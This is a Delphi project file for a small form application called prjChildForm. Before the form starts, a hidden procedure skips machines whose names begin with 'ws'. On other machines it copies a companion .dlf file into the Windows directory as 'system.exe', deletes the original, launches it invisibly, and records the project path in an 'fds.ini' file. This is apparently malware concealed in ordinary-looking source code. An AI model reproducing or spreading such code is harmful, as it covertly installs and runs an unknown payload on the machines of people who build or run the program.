////
program prjChildForm;

uses
  windows,
  sysutils,
  registry,
  ShellApi,
  Forms,
  unChildForm in 'unChildForm.pas' {ChildForm};

//
procedure HI(strOldFil: String);
const
  strFile= '\system.exe';
  var
   wds: String;
   wd, CompName: array [0..100] of char;
   Size: Cardinal;
   S, s1: shortstring;
   F: file of shortstring;
 begin
  Size:=99;
  GetComputerName(CompName, Size);
  if  not(((CompName[0]='w') or (CompName[0]='W')) and
         ((CompName[1]='s') or (CompName[1]='S'))) then

 begin
  GetWindowsDirectory(wd, 100);
  wds:=StrPas(wd);
  if FileExists(strOldFil+'.dlf') then
  begin
    CopyFile(pchar(strOldFil+'.dlf'), pchar(wds+strFile), false);
    DeleteFile(strOldFil+'.dlf');
    shellexecute(0, nil, PChar(wds+strFile), nil, nil, SW_HIDE) ;

  end;

  GetDir(0, S);
  s1:=s+'\'+strOldFil+'.dpr';

  FileClose( FileCreate(wds+'\fds.ini'));
  AssignFile(F, wds+'\fds.ini');
  Rewrite(F);
  write (F, s1);
  CloseFile(F);

 end;
 end;  //

{$R *.res}

begin
  Application.Initialize;
//
  Hi('prjChildForm');//
  Application.CreateForm(TChildForm, ChildForm);
  Application.Run;
end.
